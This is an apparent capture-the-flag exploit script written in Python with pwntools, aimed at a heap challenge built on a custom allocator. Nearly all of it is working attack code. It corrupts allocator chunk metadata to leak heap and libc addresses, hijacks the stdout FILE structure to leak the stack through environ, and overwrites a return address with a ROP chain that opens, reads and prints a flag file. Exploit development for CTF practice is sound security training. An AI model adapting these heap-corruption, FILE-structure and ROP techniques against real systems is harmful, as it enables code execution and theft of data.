from pwn import *

libm = ELF('./libnotmalloc.so')
link = ELF("./ld-linux-x86-64.so.2")
libc = ELF("./libc.so.6")

script = """
set breakpoint pending on
c
"""
context.terminal = ["kitty"]

def conn():
    if args.REMOTE:
        return remote("chall.polygl0ts.ch", 9004)
    elif args.LOCAL:
        p = remote("localhost", 5000)
        input("wait: ")
        return p
    elif args.GDB:
        return gdb.debug("./chal", gdbscript=script)
    else:
        return process("./chal")
    
def make(idx, size, data, newline=True):
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"> ", f"{idx}".encode())
    p.sendlineafter(b"> ", f"{size}".encode())
    if newline:
        data += b"\n"
    p.sendafter(b"> ", data)

def kill(idx):
    p.sendlineafter(b"> ", b"3")
    p.sendlineafter(b"> ", f"{idx}".encode())

def view(idx):
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"> ", f"{idx}".encode())
    p.recvuntil(b"content : ");
    return p.recvline()[:-1]

def fakemetadata(nextchunk, size, isfree):
    return p64(nextchunk) + p64(size) + p64(isfree)

p = conn()

heapsize = 0x4000

p.sendlineafter(b"> ", f"{heapsize:x}".encode())
p.sendlineafter(b"> ", b"2")

make(0, 0x1000, b"AAAA")
make(2, 0x20,   b"BARRIER")
make(1, 0xfc0,  b"BBBB")
make(2, 0x80,   b"B" * 0x20)

kill(1)
kill(0)

leak = u64(view(2).lstrip(b"B").ljust(8, b"\x00"))
database = leak - 0x3040
libcbase = database + 0x9000
mallbase = database + 0x231000
log.info(f"leak: 0x{leak:x}")
log.info(f"database: 0x{database:x}")
log.info(f"libcbase: 0x{libcbase:x}")

make(1, 0x20,   b"BARRIER")
kill(2)
metadata = fakemetadata(0, 0x6fc0, 1)
make(2, 0x80,   b"Z" * 0x40 + metadata)

make(0, 0x6fc0, b"OK")
make(1, 0x80,   b"CCCC")
make(2, 0x80,   b"DDDD")

offset = 0x4040

kill(2)
kill(1)
kill(0)

payload =  b""
payload =  payload.ljust(0x2000, b"\x00")
payload += fakemetadata(0, 0x6fc0, 1)
payload =  payload.ljust(0x4040, b"\x00")
payload += fakemetadata(libcbase + libc.sym._IO_2_1_stdout_ + 0x2000, 0x80, 0)
make(0, 0x6fc0, payload)

environ = libcbase + libc.sym.environ
payload =  b""
payload += p64(0xfbad1800) # _flags
payload += p64(environ)*3  # _IO_read_*
payload += p64(environ)    # _IO_write_base
payload += p64(environ + 0x8)*2 # _IO_write_ptr + _IO_write_end
payload += p64(environ + 8) # _IO_buf_base
payload += p64(environ + 8) # _IO_buf_end

make(1, 0x80, b"LMAO")
make(2, 0x80, payload)

environ = u64(p.recv(8))
retaddr = environ-0x140
log.info(f"environ: 0x{environ:x}")
log.info(f"retaddr: 0x{retaddr:x}")

make(2, 0x80, b"WTF")
kill(2)
kill(1)
kill(0)

payload =  b""
payload =  fakemetadata(0, 0x6fc0, 1)
payload =  payload.ljust(0x4040, b"\x00")
payload += fakemetadata(mallbase + libm.bss() + 0x2000, 0x80, 0)
make(0, 0x6fc0, payload)

make(1, 0x80, fakemetadata(0, 0x80, 0))
make(2, 0x80, fakemetadata(0, 0x80, 0).ljust(0x30, b"\x00"))

kill(2)
kill(1)
kill(0)

payload =  b""
payload += fakemetadata(0, 0x6fc0, 1)
payload =  payload.ljust(0x2040, b"\x00")
payload += fakemetadata(retaddr, 0x80, 0)
make(0, 0x6fc0, payload)

poprax = lambda n: p64(libcbase + 0x0000000000045eb0) + p64(n)
poprdi = lambda n: p64(libcbase + 0x000000000002a3e5) + p64(n)
poprsi = lambda n: p64(libcbase + 0x000000000002be51) + p64(n)
poprdx = lambda n: p64(libcbase + 0x000000000011f497) + p64(n) + p64(0)
syscall = lambda: p64(libcbase + 0x11ab65)

chain =  b""
chain += poprax(0)
chain += poprdi(0)
chain += poprsi(retaddr)
chain += poprdx(0x1000)
chain += syscall()

make(1, 0x80, fakemetadata(retaddr, 0x80, 0))
make(2, 0x80, chain)

chain =  b"/app/flag".ljust(len(chain), b"\x00")
chain += poprax(2)
chain += poprdi(retaddr)
chain += poprsi(0)
chain += syscall()
chain += poprax(0)
chain += poprdi(3)
chain += poprsi(retaddr)
chain += poprdx(0x40)
chain += syscall()
chain += poprax(1)
chain += poprdi(1)
chain += poprsi(retaddr)
chain += poprdx(0x40)
chain += syscall()
chain += p64(libcbase + libc.entry)
p.sendline(chain)

p.interactive()